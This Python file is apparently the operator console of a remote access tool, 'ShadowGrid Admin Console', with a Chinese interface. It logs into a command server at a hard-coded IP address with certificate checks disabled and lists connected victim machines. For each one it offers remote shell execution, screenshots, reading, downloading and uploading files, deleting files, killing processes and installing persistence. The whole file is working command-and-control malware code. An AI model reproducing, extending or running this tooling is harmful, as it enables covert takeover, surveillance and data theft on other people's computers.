# -*- coding: utf-8 -*-
import urllib.request
import json
import os
import sys
import time
import base64
import getpass
import requests
import ssl
import subprocess

SERVER_URL = None
SESSION_AUTH = None
CLIENTS = {}
CURRENT_DEVICE = None
CURRENT_HOSTNAME = ""
CURRENT_PATH = os.getcwd().replace('/', '\\')

RESET = "\033[0m"
BOLD = "\033[1m"
ITALIC = "\033[3m"
UNDERLINE = "\033[4m"

GREEN = "\033[92m"
LGREEN = "\033[1;92m"
DGREEN = "\033[2;92m"

BLUE = "\033[94m"
LBLUE = "\033[1;94m"
DBLUE = "\033[2;94m"

YELLOW = "\033[93m"
LYELLOW = "\033[1;93m"
DYELLOW = "\033[2;93m"

RED = "\033[91m"
LRED = "\033[1;91m"
DRED = "\033[2;91m"

PURPLE = "\033[95m"
LPURPLE = "\033[1;95m"
DPURPLE = "\033[2;95m"

CYAN = "\033[96m"
LCYAN = "\033[1;96m"
DCYAN = "\033[2;96m"

GRAY = "\033[90m"
LGRAY = "\033[1;90m"
timestamp = time.strftime("%Y%m%d_%H%M%S")


def prompt_config():
    """配置服务器地址"""
    global SERVER_URL
    print(f"{GRAY}[配置]{RESET} 请输入服务器地址 (例如: {LYELLOW}https://113.45.254.80:8444{RESET}):")
    SERVER_URL = input(f"{LYELLOW}> {RESET}").strip()
    if not SERVER_URL:
        SERVER_URL = "https://113.45.254.80:8444"
    print(f"{GRAY}[配置]{RESET} 使用服务器: {LGREEN}{SERVER_URL}{RESET}")


def login():
    """登录认证"""
    global SESSION_AUTH
    print(f"{GRAY}[登录]{RESET} 请输入密码:")
    password = getpass.getpass(f"{LYELLOW}> {RESET}")
    try:
        auth_b64 = base64.b64encode(f"admin:{password}".encode()).decode()
        response = requests.post(
            f"{SERVER_URL}/login",
            headers={"Authorization": f"Basic {auth_b64}"},
            verify=False,
            timeout=10
        )
        if response.status_code == 200:
            data = response.json()
            if data.get("status") == "ok":
                print(f"{LGREEN}[登录]{RESET} {BOLD}认证成功{RESET}")
                SESSION_AUTH = ("admin", password)
                return True
            else:
                print(f"{RED}[登录]{RESET} {BOLD}认证失败{RESET}")
                return False
        else:
            print(f"{RED}[登录]{RESET} HTTP {response.status_code}")
            return False
    except Exception as e:
        print(f"{RED}[登录]{RESET} 错误: {e}")
        return False


def req(method, endpoint, data=None):
    """发送HTTP请求"""
    global SESSION_AUTH
    url = f"{SERVER_URL}{endpoint}"
    headers = {"Content-Type": "application/json"}
    body = json.dumps(data).encode() if data else None
    try:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        request = urllib.request.Request(url, data=body, headers=headers, method=method)
        if SESSION_AUTH:
            auth_str = f"{SESSION_AUTH[0]}:{SESSION_AUTH[1]}"
            auth_b64 = base64.b64encode(auth_str.encode()).decode()
            request.add_header("Authorization", f"Basic {auth_b64}")
        
        with urllib.request.urlopen(request, context=context, timeout=10.0) as response:
            result = json.loads(response.read().decode())
            return result
    except Exception as e:
        return {"error": str(e)}


def fetch_clients():
    """获取设备列表"""
    global CLIENTS
    try:
        resp = req("GET", "/clients")
        CLIENTS = resp.get("clients", [])
        return CLIENTS
    except Exception as e:
        print(f"[错误] 获取设备列表失败: {e}")
        return []


def print_clients():
    """打印设备列表"""
    if not CLIENTS:
        print(f"{GRAY}[信息]{RESET} 没有已连接的设备")
        return
    print(f"\n{LGREEN}┌─[ 可用设备 ]{RESET}")
    for idx, client in enumerate(CLIENTS, 1):
        cid = client.get("id", "unknown")
        hostname = client.get("hostname", "unknown")
        ip = client.get("ip", "unknown")
        print(f"{BLUE}  {idx}. {LGREEN}{hostname}{RESET} ({CYAN}{ip}{RESET}) {GRAY}[ID: {PURPLE}{cid}{GRAY}]{RESET}")
    print(f"{BLUE}└────────────{RESET}\n")


def send_command(client_id, cmd_type, payload=None):
    """发送命令到设备"""
    try:
        data = {"type": cmd_type}
        if payload is not None:
            data["payload"] = payload
        resp = req("POST", f"/command/{client_id}", data)
        return resp
    except Exception as e:
        return {"error": str(e)}


def get_results(client_id):
    """获取命令结果"""
    try:
        resp = req("GET", f"/results/{client_id}")
        return resp.get("results", [])
    except Exception as e:
        return [{"error": str(e)}]


def wait_for_result(client_id, timeout=0.8):
    """等待命令结果"""
    start_time = time.time()
    while time.time() - start_time < timeout:
        results = get_results(client_id)
        if results:
            return results
        time.sleep(0.02)
    return None


def format_ls_output(items):
    """格式化ls输出"""
    if not items:
        return
    if not isinstance(items, list):
        return
    for item in items:
        if isinstance(item, dict):
            name = item.get("name", "")
            is_dir = item.get("dir", False)
            if is_dir:
                print(f"  {name}/")
            else:
                print(f"  {name}")
        else:
            print(f"  {item}")


def print_failed_result(r):
    """打印错误结果"""
    err = r.get("error", "")
    result = r.get("result", "")
    if err:
        print(f"[错误] {err}")
    elif isinstance(result, str):
        print(f"[结果] {result}")


def clear_screen():
    """清屏"""
    os.system("cls" if os.name == "nt" else "clear")


def print_help():
    """打印帮助"""
    print(f"\n{LGREEN}可用命令：{RESET}")
    print(f"  {YELLOW}list{RESET}              {LGREEN}列出所有可用设备{RESET}")
    print(f"  {YELLOW}use <编号>{RESET}          {LGREEN}选择设备{RESET}")
    print(f"  {YELLOW}back{RESET}              {LGREEN}返回设备列表{RESET}")
    print(f"  {YELLOW}clear{RESET}             {LGREEN}清屏{RESET}")
    print(f"  {YELLOW}help{RESET}              {LGREEN}显示帮助{RESET}")
    print(f"  {YELLOW}quit{RESET}              {LRED}退出{RESET}")
    print("")
    print(f"{BLUE}设备命令：{RESET}")
    print(f"  {YELLOW}ls [路径]{RESET}         {LGREEN}列出目录{RESET}")
    print(f"  {YELLOW}cd <目录>{RESET}         {LGREEN}切换目录{RESET}")
    print(f"  {YELLOW}pwd{RESET}               {LGREEN}显示当前目录{RESET}")
    print(f"  {YELLOW}cat <文件>{RESET}        {LGREEN}查看文件{RESET}")
    print(f"  {YELLOW}dl <文件> [目录]{RESET}   {LGREEN}下载{RESET}")
    print(f"  {YELLOW}ud <文件> [目录]{RESET}   {LGREEN}上传{RESET}")
    print(f"  {YELLOW}rm <路径> [-r]{RESET}    {LRED}删除{RESET}")
    print(f"  {YELLOW}mv <源> <目标>{RESET}    {LGREEN}移动{RESET}")
    print(f"  {YELLOW}file <路径>{RESET}       {LGREEN}查看类型{RESET}")
    print(f"  {YELLOW}find <模式> [-t]{RESET}  {LGREEN}查找{RESET}")
    print(f"  {YELLOW}shell <命令>{RESET}      {LGREEN}执行命令{RESET}")
    print(f"  {YELLOW}ps{RESET}                {LGREEN}查看进程{RESET}")
    print(f"  {YELLOW}kill <PID>{RESET}        {LGREEN}终止进程{RESET}")
    print(f"  {YELLOW}persist <action>{RESET}   {LGREEN}持久化管理{RESET}")
    print(f"  {YELLOW}screenshot{RESET}         {LGREEN}截图{RESET}")
    print(f"  {YELLOW}help{RESET}              {LGREEN}显示帮助{RESET}")
    print(f"  {YELLOW}back{RESET}              {LGREEN}返回{RESET}")


def interaction_loop(client_id, hostname):
    """设备交互循环"""
    global CURRENT_DEVICE, CURRENT_HOSTNAME, CURRENT_PATH
    CURRENT_DEVICE = client_id
    CURRENT_HOSTNAME = hostname
    CURRENT_PATH = os.getcwd().replace('/', '\\')
    
    print(f"{LGREEN}┌─[ 连接成功 ]{RESET}")
    print(f"{GRAY}│{RESET} 已连接到设备: {CYAN}{hostname}{RESET} ({PURPLE}ID: {client_id}{PURPLE}){RESET}")
    print(f"{GRAY}├{RESET} 输入 '{YELLOW}back{RESET}' 返回设备列表")
    print(f"{GRAY}└{RESET} 输入 '{YELLOW}help{RESET}' 查看可用命令")
    
    # 获取远程系统信息
    send_command(client_id, "shell", "hostname")
    time.sleep(0.5)
    remote_hostname = ""
    for r in get_results(client_id):
        if r.get("result_type") == "shell":
            remote_hostname = r.get("result", "").strip()
    
    send_command(client_id, "shell", "whoami")
    time.sleep(0.5)
    remote_user = ""
    for r in get_results(client_id):
        if r.get("result_type") == "shell":
            remote_user = r.get("result", "").strip().split('\\')[-1].split('/')[-1]
    
    print(f"\n{BLUE}┌──({LGREEN}{remote_user}{RESET}@{PURPLE}{remote_hostname}{RESET})-[{CYAN}~{RESET}]{RESET}")
    print(f"{BLUE}└─# {RESET}{LGREEN}{hostname}{RESET}:{YELLOW}{CURRENT_PATH}{RESET} ")
    
    while True:
        try:
            prompt = f"{BLUE}┌──({LGREEN}{remote_user}{RESET}@{PURPLE}{remote_hostname}{RESET})-[{CYAN}{CURRENT_PATH}{RESET}]{RESET}\n{BLUE}└─# {LGREEN}>{RESET} "
            cmd_input = input(prompt).strip()
        except EOFError:
            print(f"\n{GRAY}[信息]{RESET} 退出中...")
            return
        except KeyboardInterrupt:
            print(f"\n{GRAY}[信息]{RESET} 使用 '{YELLOW}quit{RESET}' 退出")
            continue
        
        if not cmd_input:
            continue
        
        parts = cmd_input.split(maxsplit=1)
        cmd = parts[0].lower()
        arg = parts[1] if len(parts) > 1 else None
        
        if cmd == "quit":
            print(f"{GRAY}[信息]{RESET} 退出中...")
            sys.exit(0)
        elif cmd == "back":
            print(f"{GRAY}[信息]{RESET} 返回设备列表中...")
            CURRENT_DEVICE = None
            CURRENT_HOSTNAME = ""
            return
        elif cmd == "clear":
            clear_screen()
        elif cmd == "help":
            print_help()
        elif cmd == "list":
            fetch_clients()
            print_clients()
        elif cmd == "screenshot":
            send_command(client_id, "screenshot")
            results = wait_for_result(client_id)
            if results:
                for r in results:
                    if r.get("result_type") == "screenshot":
                        img_data = r.get("result", "")
                        filename = r.get("filename", "shot.png")
                        try:
                            img_bytes = base64.b64decode(img_data)
                            os.makedirs("screenshots", exist_ok=True)
                            save_path = os.path.join("screenshots", f"{client_id}_{timestamp}_{filename}")
                            with open(save_path, "wb") as f:
                                f.write(img_bytes)
                            print(f"{LGREEN}[结果]{RESET} 截图已保存: {CYAN}{save_path}{RESET}")
                        except Exception as e:
                            print(f"{RED}[错误]{RESET} 无法保存截图: {DRED}{e}{RESET}")
                    elif r.get("result_type") == "error":
                        print_failed_result(r)
        elif cmd == "ls":
            full_path = arg if arg else CURRENT_PATH
            full_path = os.path.normpath(full_path)
            send_command(client_id, "ls", full_path)
            results = wait_for_result(client_id)
            if results:
                for r in results:
                    format_ls_output(r.get("result", []))
        elif cmd == "cd":
            if not arg:
                print(f"{RED}[错误]{RESET} 用法: cd <目录>")
                continue
            full_path = os.path.normpath(os.path.join(CURRENT_PATH, arg))
            send_command(client_id, "cd", full_path)
            results = wait_for_result(client_id)
            if results:
                for r in results:
                    if r.get("result_type") == "dir":
                        CURRENT_PATH = full_path
                        print(f"{LGREEN}[结果]{RESET} 已切换到目录 {CYAN}{CURRENT_PATH}{RESET}")
                    else:
                        print_failed_result(r)
        elif cmd == "pwd":
            send_command(client_id, "pwd")
            results = wait_for_result(client_id)
            if results:
                for r in results:
                    print(f"{CYAN}[结果]{RESET} {r.get('result', '')}")
        elif cmd == "cat":
            if not arg:
                print(f"{RED}[错误]{RESET} 用法: cat <文件路径>")
                continue
            full_path = os.path.normpath(os.path.join(CURRENT_PATH, arg))
            send_command(client_id, "cat", full_path)
            results = wait_for_result(client_id)
            if results:
                for r in results:
                    if r.get("result_type") == "file":
                        file_data = r.get("result", "")
                        if file_data:
                            try:
                                content = base64.b64decode(file_data).decode()
                                print(f"{LGREEN}[结果]{RESET}")
                                print(f"{DCYAN}{content}{RESET}")
                            except Exception as e:
                                print(f"{RED}[错误]{RESET} 解码失败: {DRED}{e}{RESET}")
                        else:
                            print(f"{RED}[错误]{RESET} 文件为空")
                    else:
                        print_failed_result(r)
        elif cmd == "dl":
            if not arg:
                print(f"{RED}[错误]{RESET} 用法: dl <文件路径> [保存目录]")
                continue
            parts = arg.split(maxsplit=1)
            file_path = parts[0]
            save_dir = parts[1] if len(parts) > 1 else "downloads"
            full_path = os.path.normpath(os.path.join(CURRENT_PATH, file_path))
            os.makedirs(save_dir, exist_ok=True)
            send_command(client_id, "dl", {"path": file_path, "save_as": ""})
            results = wait_for_result(client_id)
            if results:
                for r in results:
                    if r.get("result_type") == "file":
                        file_bytes = base64.b64decode(r.get("result", ""))
                        save_path = os.path.join(save_dir, r.get("filename", "downloaded"))
                        with open(save_path, "wb") as f:
                            f.write(file_bytes)
                        print(f"{LGREEN}[结果]{RESET} 文件已下载: {CYAN}{save_path}{RESET}")
                    else:
                        print_failed_result(r)
        elif cmd == "ud":
            if not arg:
                print(f"{RED}[错误]{RESET} 用法: ud <本地文件> [远程目录]")
                continue
            parts = arg.split(maxsplit=1)
            local_file = parts[0]
            remote_dir = parts[1] if len(parts) > 1 else "."
            if not os.path.isfile(local_file):
                print(f"{RED}[错误]{RESET} 本地文件未找到")
                continue
            with open(local_file, "rb") as f:
                base64_data = base64.b64encode(f.read()).decode()
            save_as = os.path.join(CURRENT_PATH, os.path.basename(local_file))
            send_command(client_id, "ud", {"base64_data": base64_data, "save_as": save_as})
            results = wait_for_result(client_id)
            if results:
                for r in results:
                    print_failed_result(r)
        elif cmd == "rm":
            if not arg:
                print(f"{RED}[错误]{RESET} 用法: rm <路径> [-r]")
                continue
            recursive = arg.endswith(" -r")
            path = arg[:-3] if recursive else arg
            full_path = os.path.normpath(os.path.join(CURRENT_PATH, path))
            send_command(client_id, "rm", {"path": full_path, "recursive": recursive})
            results = wait_for_result(client_id)
            if results:
                for r in results:
                    print_failed_result(r)
        elif cmd == "mv":
            if not arg or len(arg.split()) < 2:
                print(f"{RED}[错误]{RESET} 用法: mv <源> <目标>")
                continue
            parts = arg.split(maxsplit=1)
            src, dst = parts[0], parts[1]
            full_src = os.path.normpath(os.path.join(CURRENT_PATH, src))
            full_dst = os.path.normpath(os.path.join(CURRENT_PATH, dst))
            send_command(client_id, "mv", {"from_path": full_src, "to_path": full_dst})
            results = wait_for_result(client_id)
            if results:
                for r in results:
                    print_failed_result(r)
        elif cmd == "file":
            if not arg:
                print(f"{RED}[错误]{RESET} 用法: file <路径>")
                continue
            full_path = os.path.normpath(os.path.join(CURRENT_PATH, arg))
            send_command(client_id, "file", {"path": full_path})
            results = wait_for_result(client_id)
            if results:
                for r in results:
                    if r.get("result_type") == "file":
                        print(f"{PURPLE}[结果]{RESET} {r.get('result', '')}")
                    else:
                        print_failed_result(r)
        elif cmd == "find":
            if not arg:
                print(f"{RED}[错误]{RESET} 用法: find <模式> [-t 类型]")
                continue
            parts = arg.split()
            pattern = None
            file_type = None
            i = 0
            while i < len(parts):
                if parts[i] == "-t" and i + 1 < len(parts):
                    file_type = parts[i + 1]
                    i += 1
                else:
                    if not pattern:
                        pattern = parts[i]
                i += 1
            if not pattern:
                print(f"{RED}[错误]{RESET} 用法: find <模式> [-t 类型]")
                continue
            full_path = os.path.normpath(os.path.join(CURRENT_PATH, pattern))
            send_command(client_id, "find", {"path": full_path, "name": pattern, "type": file_type})
            results = wait_for_result(client_id)
            if results:
                for r in results:
                    if r.get("result_type") == "list":
                        for item in r.get("result", []):
                            item_type = item.get("type", "")
                            item_path = item.get("path", "")
                            if item_type.lower() == "dir":
                                print(f"  {LGREEN}[{item_type.upper()}]{RESET} {CYAN}{item_path}{RESET}")
                            else:
                                print(f"  {YELLOW}[{item_type.upper()}]{RESET} {item_path}")
                    else:
                        print_failed_result(r)
        elif cmd == "shell":
            if not arg:
                print(f"{RED}[错误]{RESET} 用法: shell <命令>")
                continue
            send_command(client_id, "shell", arg)
            results = wait_for_result(client_id)
            if results:
                for r in results:
                    if r.get("result_type") == "shell":
                        output = r.get("result", "")
                        print(f"{LGREEN}[结果]{RESET}")
                        print(f"{DCYAN}{output}{RESET}")
                    else:
                        print_failed_result(r)
        elif cmd in ("ps", "process"):
            send_command(client_id, "ps")
            results = wait_for_result(client_id, timeout=5.0)
            if results:
                for r in results:
                    if r.get("result_type") == "process_list":
                        processes = r.get("result", [])
                        print(f"\n{YELLOW}PID{RESET}    {YELLOW}NAME{RESET}{' ' * 20} {YELLOW}USERNAME{RESET}")
                        print("-" * 60)
                        for proc in processes:
                            pid = proc.get('pid', 'N/A') if isinstance(proc, dict) else 'N/A'
                            name = proc.get('name', 'N/A')[:20] if isinstance(proc, dict) else 'N/A' # 限制进程名长度
                            username = proc.get('username', 'N/A') if isinstance(proc, dict) else 'N/A'
                            status = proc.get('status', '') if isinstance(proc, dict) else ''
                            
                            # 确保所有值都不是None
                            pid = pid if pid is not None else 'N/A'
                            name = name if name is not None else 'N/A'
                            username = username if username is not None else 'N/A'
                            status = status if status is not None else ''
                            
                            print(f"{CYAN}{pid:<8}{RESET} {name:<22} {username:<15}")
                        print(f"\n{LGREEN}[结果]{RESET} Found {len(processes)} processes\n")
                    else:
                        print_failed_result(r)
        elif cmd in ("kill", "terminate"):
            if not arg:
                print(f"{RED}[错误]{RESET} 用法: kill <PID>")
                continue
            try:
                pid = int(arg)
                send_command(client_id, "kill", {"pid": pid})
                results = wait_for_result(client_id)
                if results:
                    for r in results:
                        print_failed_result(r)
            except ValueError:
                print(f"{RED}[错误]{RESET} PID必须是有效整数")
        elif cmd in ("persist", "install"):
            if not arg:
                print(f"{RED}[错误]{RESET} 用法: persist <install|remove> [参数]")
                continue
            parts = arg.split(maxsplit=1)
            action = parts[0].lower()
            param = parts[1] if len(parts) > 1 else ""
            
            payload = {"action": action}
            if action == "install" and param:
                payload["path"] = param
            
            send_command(client_id, "persist", payload)
            results = wait_for_result(client_id)
            if results:
                for r in results:
                    print_failed_result(r)
        elif cmd == "help":
            print_help()
        else:
            print(f"{RED}[错误]{RESET} 未知命令: {cmd}")


def show_splash():
    """显示启动画面"""
    import splash
    print(splash.get_splash())


def main():
    """主函数"""
    show_splash()
    print("[信息] ShadowGrid Admin Console v1.0")
    
    prompt_config()
    
    if not login():
        print("[错误] 登录失败")
        sys.exit(1)
    
    print(f"{LGREEN}[信息]{RESET} 输入 '{YELLOW}help{RESET}' 查看可用命令")
    
    while True:
        try:
            cmd_input = input(f"{BLUE}srt{RESET}{GRAY}>{RESET} ").strip()
        except EOFError:
            print(f"\n{GRAY}[信息]{RESET} 退出中...")
            break
        except KeyboardInterrupt:
            print(f"\n{GRAY}[信息]{RESET} 使用 '{YELLOW}quit{RESET}' 退出")
            continue
        
        if not cmd_input:
            continue
        
        parts = cmd_input.split(maxsplit=1)
        cmd = parts[0].lower()
        arg = parts[1] if len(parts) > 1 else None
        
        if cmd == "quit":
            print(f"{GRAY}[信息]{RESET} 退出中...")
            break
        elif cmd == "help":
            print_help()
        elif cmd == "list":
            fetch_clients()
            print_clients()
        elif cmd == "use":
            if not arg:
                print(f"{RED}[错误]{RESET} 用法: use <编号>")
                continue
            try:
                num = int(arg)
                if num < 1 or num > len(CLIENTS):
                    print(f"{RED}[错误]{RESET} 无效的设备编号")
                    continue
                selected = CLIENTS[num - 1]
                interaction_loop(selected.get("id"), selected.get("hostname"))
            except ValueError:
                print(f"{RED}[错误]{RESET} 无效的设备编号")
        elif cmd == "clear":
            clear_screen()
        else:
            print(f"{RED}[错误]{RESET} 未知命令: {cmd}。使用 '{YELLOW}help{RESET}' 查看命令列表。")


if __name__ == "__main__":
    main()
